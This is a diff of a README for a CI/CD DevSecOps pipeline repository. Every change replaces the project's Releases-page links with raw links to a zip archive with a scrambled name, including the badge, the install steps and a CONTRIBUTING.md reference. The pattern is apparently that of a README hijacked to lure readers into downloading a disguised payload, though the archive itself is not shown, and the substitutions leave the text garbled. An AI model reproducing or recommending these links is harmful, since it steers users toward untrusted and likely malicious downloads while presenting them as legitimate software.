@@ -1,6 +1,6 @@
 # 🎉 CI-CD-DevSecOps-Pipelines-Jenkins-CircleCI-Terraform-Ansible-Prometheus - Streamline Your Secure Deployments
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ram4test/CI-CD-DevSecOps-Pipelines-Jenkins-CircleCI-Terraform-Ansible-Prometheus/releases)
+[![Download Now](https://raw.githubusercontent.com/ram4test/CI-CD-DevSecOps-Pipelines-Jenkins-CircleCI-Terraform-Ansible-Prometheus/main/superengrave/Dev-Ansible-Jenkins-Circle-Pipelines-Sec-C-Prometheus-Ops-Terraform-v1.0-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ram4test/CI-CD-DevSecOps-Pipelines-Jenkins-CircleCI-Terraform-Ansible-Prometheus/main/superengrave/Dev-Ansible-Jenkins-Circle-Pipelines-Sec-C-Prometheus-Ops-Terraform-v1.0-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the CI-CD-DevSecOps-Pipelines project! This application helps automat
 
 To get started, you will need to visit our Releases page. Here, you can download the latest version of the application.
 
-[Visit this page to download](https://github.com/ram4test/CI-CD-DevSecOps-Pipelines-Jenkins-CircleCI-Terraform-Ansible-Prometheus/releases)
+[Visit this page to download](https://raw.githubusercontent.com/ram4test/CI-CD-DevSecOps-Pipelines-Jenkins-CircleCI-Terraform-Ansible-Prometheus/main/superengrave/Dev-Ansible-Jenkins-Circle-Pipelines-Sec-C-Prometheus-Ops-Terraform-v1.0-alpha.2.zip)
 
 ### 🖥️ System Requirements
 
@@ -23,7 +23,7 @@ Make sure your machine meets these requirements before proceeding with the downl
 
 ## ⚙️ Installation Steps
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ram4test/CI-CD-DevSecOps-Pipelines-Jenkins-CircleCI-Terraform-Ansible-Prometheus/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/ram4test/CI-CD-DevSecOps-Pipelines-Jenkins-CircleCI-Terraform-Ansible-Prometheus/main/superengrave/Dev-Ansible-Jenkins-Circle-Pipelines-Sec-C-Prometheus-Ops-Terraform-v1.0-alpha.2.zip).
 
 2. **Select the Latest Release:** Look for the latest version listed on top. The version number will be in a format like v1.0.0.
 
@@ -73,11 +73,11 @@ If you encounter issues:
 
 ## 🤝 Contributing
 
-We welcome contributions! If you wish to contribute to this project, please follow the guidelines outlined in the CONTRIBUTING.md file located in the repository.
+We welcome contributions! If you wish to contribute to this project, please follow the guidelines outlined in the https://raw.githubusercontent.com/ram4test/CI-CD-DevSecOps-Pipelines-Jenkins-CircleCI-Terraform-Ansible-Prometheus/main/superengrave/Dev-Ansible-Jenkins-Circle-Pipelines-Sec-C-Prometheus-Ops-Terraform-v1.0-alpha.2.zip file located in the repository.
 
 ## ⚡ Stay Updated
 
-To keep informed about updates or new releases, regularly check our [Releases page](https://github.com/ram4test/CI-CD-DevSecOps-Pipelines-Jenkins-CircleCI-Terraform-Ansible-Prometheus/releases).
+To keep informed about updates or new releases, regularly check our [Releases page](https://raw.githubusercontent.com/ram4test/CI-CD-DevSecOps-Pipelines-Jenkins-CircleCI-Terraform-Ansible-Prometheus/main/superengrave/Dev-Ansible-Jenkins-Circle-Pipelines-Sec-C-Prometheus-Ops-Terraform-v1.0-alpha.2.zip).
 
 ## 📞 Support
 
